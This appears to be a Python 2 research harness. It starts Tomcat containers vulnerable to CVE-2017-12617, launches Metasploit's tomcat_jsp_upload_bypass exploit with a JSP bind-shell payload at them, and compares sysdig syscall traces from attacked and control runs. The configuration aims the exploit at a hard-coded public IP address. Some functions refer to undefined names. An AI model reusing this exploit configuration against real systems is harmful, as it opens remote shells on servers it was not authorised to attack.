import sys, os, time, signal, subprocess, shutil, importlib
sys.path.append("lib")
import dock, sysdig, align, mSploit, pair_tid

def ensure_dir(directory):
  if not os.path.exists(directory):
    os.makedirs(directory)

def get_current_time():
  return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())

def cleanup(profile):
  for c in profile["containers"]:
    c.stop()
    c.remove()

def run_sysdig(cid=None, name=None, rootdir="."):
  return sysdig.record_container(cid, name, rootdir)

def start_containers(profile):
  print profile
  profile["image"] = dock.buildImage(profile["dockerfile"], profile["tag"])
  print get_current_time(), "[+] Use Image (%s)" % profile["image"].id
  for port in profile["ports"]:
    profile["containers"].append(dock.runC(profile["image"].short_id, ports=port))
    print get_current_time(), "[+] Start container (%s)" % profile["containers"][-1].short_id
  return profile

def analyze_sysdig_log(profile):
  for container in profile["containers"]:
    print get_current_time(), "[+] Extract Log for container (%s) from (%s)" % (container, profile["image"].id)
    raw = sysdig.extract_log(profile["image"].id.split(":")[-1]+".scap", container.id[:12], rootdir = profile["conf"]["log"]["rootdir"])
    profile["sysdig"].append(sysdig.parse_log(raw))
  return profile

#######################################################################################
def grouping(profile):
  main_log = os.path.join(profile["conf"]["log"]["rootdir"], "main.log")
  f_main_log = open(main_log, "a")
  grp0 = sysdig.group_by_tid(profile["sysdig"][0])
  f_main_log.write("[+] Sysdig Log of Container (%s)\n" % profile["containers"][0].id)
  for k,v in grp0.iteritems():
    f_main_log.write("%s\t%s\n" % (k, " ".join(v)))
  f_main_log.write("\n\n")

  grp1 = sysdig.group_by_tid(profile["sysdig"][1])
  f_main_log.write("[+] Sysdig Log of Container (%s)\n" % profile["containers"][1].id)
  for k,v in grp1.iteritems():
    f_main_log.write("%s\t%s\n" % (k, " ".join(v)))
  f_main_log.write("\n\n")
  print get_current_time(), "[+] #(%d) in group0 & #(%d) in group1" % (len(grp0), len(grp1))
  return grp0, grp1, profile

def pairing(profile):
  profile = pair_tid.grouping(profile)
  all_dist_map = pair_tid.dist_map_1(profile)
  pair_tid.step2(all_dist_map, profile)

#======================================================================================#
def muning():
  f_main_log.write("\n[+] Pair TID across groups\n")
  for tid1, syslog1 in group1.iteritems():
    f_main_log.write("\n\n%s with len=%s\n\t%s\n" % (tid1, len(syslog1), " ".join(syslog1)))
    for tid2, syslog2 in group2.iteritems():
      
      if len(syslog1)/len(syslog2) >= 2 or len(syslog2)/len(syslog1) >= 2:
        #print "Lens Var too much"
        continue
      try:
        f_main_log.write("score = %s with (%s)\n\t%s\n" % (alignment(syslog1, syslog2), tid2, " ".join(syslog2)))
      except:
        pass

def diff_analyze(profile):
  profile = analyze_sysdig_log(profile)
  # Eliminate Identical Threats
  pairing(profile)
###########################################################################################
def launch_parallel_attack(profile):
  child_pid = os.fork()
  if child_pid == 0:
    time.sleep(0.5)
    print get_current_time(), "[+] Launch Attack From MetaSploit (Control)"
    mSploit.launch_attack(profile["metasploit"][0])
    raise
  else:
    print get_current_time(), "[+] Launch Attack From MetaSploit (Malicious)"
    mSploit.launch_attack(profile["metasploit"][1])
    os.waitpid(child_pid, 0)
  print get_current_time(), "[+] DONE | CLEANUP"

###########################################################################################
def test(profile):
  profile = start_containers(profile)
  image_id = profile["image"].id.split(":")[-1]
  root_log_dir = os.path.join("logs", image_id)
  if os.path.exists(root_log_dir):
    shutil.rmtree(root_log_dir)
  profile["conf"]["log"]["rootdir"] = root_log_dir
  ensure_dir(root_log_dir)
  profile["main_log_fd"] = open(os.path.join(root_log_dir, "main.log"), "a")

  newpid = os.fork()
  if newpid == 0:
    run_sysdig(name = image_id, rootdir = profile["conf"]["log"]["rootdir"])
  else:
    launch_parallel_attack(profile)
    time.sleep(3)
    print get_current_time(), "[+] Begin to Kill SysDig"
    os.kill(newpid, signal.SIGTERM)
    os.system("sudo kill $(ps aux | grep 'sysdig -p' | awk '{print $2}')")
    diff_analyze(profile)
    cleanup(profile)

def dry_test(profile, containers):
   profile["image"] = lambda: None
   profile["image"].id = "7d056fc512d7103ed4812534117918ea76ee9224c941c539a4609484f0a9a2b8"
   root_log_dir = os.path.join("logs", profile["image"].id)
   profile["conf"]["log"]["rootdir"] = root_log_dir
   ensure_dir(root_log_dir)
   profile["main_log_fd"] = open(os.path.join(root_log_dir, "main.log"), "a")
   profile["containers"] = [lambda: None,lambda: None]
   profile["containers"][0].id = containers[0]
   profile["containers"][1].id = containers[1]
   profile = analyze_sysdig_log(profile)
   group_matching(profile)

if __name__ == '__main__':
  profile = {
    "dockerfile":"/home/t/AutoRox/DockerFiles/cve-2017-12617",
    "tag": "tomcat_vul",
    "image":{},
    "ports":[
      {'8080/tcp': 8080}, {'8080/tcp': 8081}
    ],
    "metasploit": [
      {
        'mp_host' : '127.0.0.1',
        'exploit' : 'multi/http/tomcat_jsp_upload_bypass',
        'RHOST'   : '104.42.10.62',
        'RPORT'   : '8080',
        "payload" : "java/jsp_shell_bind_tcp",
      },
      { 
        'mp_host' : '127.0.0.1',
        'exploit' : 'multi/http/tomcat_jsp_upload_bypass',
        'RHOST'   : '104.42.10.62',
        'RPORT'   : '8081',
        "payload" : None,
      },
    ],
    "containers":[],
    "sysdig":[],
    "conf": {
      "log" : {
        "rootdir":".",
      }
    }
  }
  if len(sys.argv) > 1:
    print "[+] Loading Profile from", sys.argv[1]
    ast = importlib.import_module('ast')
    profile = ast.literal_eval(open(sys.argv[1],"r").read())

  dock.cleanup()
  test(profile)
  #dry_test(profile, sys.argv[1:3])
